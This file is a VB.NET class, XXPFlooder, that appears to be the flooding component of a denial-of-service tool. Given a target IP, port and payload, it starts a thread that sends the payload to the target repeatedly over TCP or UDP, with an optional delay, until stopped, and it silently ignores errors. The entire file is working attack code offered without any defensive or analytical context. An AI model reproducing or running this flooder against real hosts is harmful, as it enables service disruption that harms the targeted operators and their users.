Imports System
Imports System.Net.Sockets
Imports System.ComponentModel


Public Class XXPFlooder

    Public Sub New(ByVal ip As String, ByVal port As Integer, ByVal proto As Integer, ByVal delay As Integer, ByVal resp As Boolean, ByVal data As String)
        MyBase.New()
        Me.IP = ip
        Me.Port = port
        Me.Protocol = proto
        Me.Delay = delay
        Me.Resp = resp
        Me.Data = data
    End Sub
    Public IsFlooding As Boolean
    Public FloodCount As Integer
    Public IP As String
    Public Port As Integer
    Public Protocol As Integer
    Public Delay As Integer
    Public Resp As Boolean
    Public Data As String

    Public Sub Start()
        IsFlooding = True
        'Dim bw As New BackgroundWorker
        'AddHandler bw.DoWork, AddressOf Me.bw_DoWork
        'bw.RunWorkerAsync()
        Dim nt As New Threading.Thread(AddressOf Me.bw_DoWork)
        nt.Start()
    End Sub
    Private Sub bw_DoWork() '(ByVal sender As Object, ByVal e As DoWorkEventArgs)
        Try
            Dim buf() As Byte = System.Text.Encoding.ASCII.GetBytes(Data)
            Dim RHost As New System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port)

            While IsFlooding
                Dim socket As Socket = Nothing
                If (Protocol = 1) Then
                    socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                    socket.Connect(RHost)
                    socket.Blocking = Resp
                    Try

                        While IsFlooding
                            FloodCount = (FloodCount + 1)
                            socket.Send(buf)
                            If (Delay > 0) Then
                                System.Threading.Thread.Sleep(Delay)
                            End If

                        End While
                    Catch ex As System.Exception

                    End Try
                End If
                If (Protocol = 2) Then
                    socket = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                    socket.Blocking = Resp
                    Try

                        While IsFlooding
                            FloodCount = (FloodCount + 1)
                            socket.SendTo(buf, SocketFlags.None, RHost)
                            If (Delay > 0) Then
                                System.Threading.Thread.Sleep(Delay)
                            End If

                        End While
                    Catch ex As System.Exception

                    End Try
                End If

            End While
        Catch ex As System.Exception

        End Try
    End Sub
End Class